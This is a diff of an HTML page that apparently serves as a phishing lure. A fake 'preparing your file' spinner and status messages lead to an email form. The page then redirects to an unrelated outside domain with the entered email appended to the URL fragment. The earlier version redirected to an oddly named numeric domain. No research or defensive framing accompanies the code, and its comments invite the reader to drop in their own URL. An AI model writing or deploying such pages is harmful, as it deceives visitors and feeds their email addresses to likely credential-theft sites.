@@ -2,80 +2,99 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>File Loading...</title>
+<title>Loading Experience</title>
 <style>
 body {
   margin: 0;
+  font-family: Arial, sans-serif;
+  background: #0f172a;
+  color: white;
   display: flex;
-  justify-content: center;
   align-items: center;
+  justify-content: center;
   height: 100vh;
-  font-family: "Segoe UI", sans-serif;
-  background: #eef2f7;
-  color: #333;
+}
+.container {
   text-align: center;
 }
-
-#message {
-  font-size: 24px;
-  margin-bottom: 20px;
-  min-height: 30px;
+.spinner {
+  width: 50px;
+  height: 50px;
+  border: 5px solid #ccc;
+  border-top: 5px solid #3b82f6;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 20px auto;
 }
-
-#status {
-  font-size: 18px;
-  color: #555;
+@keyframes spin {
+  100% { transform: rotate(360deg); }
 }
-
-#dots {
-  display: inline-block;
-  margin-left: 5px;
-  width: 20px;
+.hidden {
+  display: none;
+}
+input {
+  padding: 10px;
+  width: 250px;
+  margin-top: 15px;
+  border-radius: 5px;
+  border: none;
+}
+button {
+  padding: 10px 20px;
+  margin-top: 10px;
+  background: #3b82f6;
+  border: none;
+  color: white;
+  border-radius: 5px;
+  cursor: pointer;
 }
 </style>
 </head>
 <body>
 
-<div>
-  <div id="message"></div>
-  <div id="status">Preparing your file<span id="dots"></span></div>
+<div class="container">
+  <h2>Please wait...</h2>
+  <div class="spinner" id="spinner"></div>
+  <div id="status">Initializing...</div>
+
+  <div id="formBox" class="hidden">
+    <h3>Enter your email</h3>
+    <input type="email" id="email" placeholder="you@example.com" />
+    <br>
+    <button onclick="submitEmail()">Continue</button>
+  </div>
 </div>
 
 <script>
-// Typing effect
-const messageText = "Hello, your file is loading... generating... please wait.";
-const messageEl = document.getElementById("message");
-let index = 0;
+const status = document.getElementById("status");
+const spinner = document.getElementById("spinner");
+const formBox = document.getElementById("formBox");
 
-function typeMessage() {
-  if (index < messageText.length) {
-    messageEl.textContent += messageText.charAt(index);
-    index++;
-    setTimeout(typeMessage, 100); // typing speed
-  } else {
-    startLoadingDots();
-    // Redirect after 3 seconds of showing dots
-    setTimeout(() => {
-      window.location.href = "https://64g88587877.com/"; // Replace with your URL
-    }, 3000);
+setTimeout(() => status.textContent = "Loading...", 1500);
+setTimeout(() => status.textContent = "Preparing your file...", 3000);
+setTimeout(() => status.textContent = "Almost ready...", 4500);
+setTimeout(() => status.textContent = "Done!", 6000);
+
+setTimeout(() => {
+  spinner.style.display = "none";
+  status.style.display = "none";
+  formBox.classList.remove("hidden");
+}, 7500);
+
+function submitEmail() {
+  const email = document.getElementById("email").value;
+
+  if (!email) {
+    alert("Please enter an email");
+    return;
   }
+
+  // Proper way: pass email as a query parameter
+  const encodedEmail = encodeURIComponent(email);
+
+  // Replace with your real site later
+  window.location.href = "https://gwenandmarysafehaven.com/spiderman/#" + encodedEmail;
 }
-
-// Loading dots animation
-const dotsEl = document.getElementById("dots");
-let dotsCount = 0;
-let dotsInterval;
-
-function startLoadingDots() {
-  dotsInterval = setInterval(() => {
-    dotsCount = (dotsCount + 1) % 4; // 0,1,2,3
-    dotsEl.textContent = ".".repeat(dotsCount);
-  }, 500);
-}
-
-// Start typing on page load
-window.onload = typeMessage;
 </script>
 
 </body>
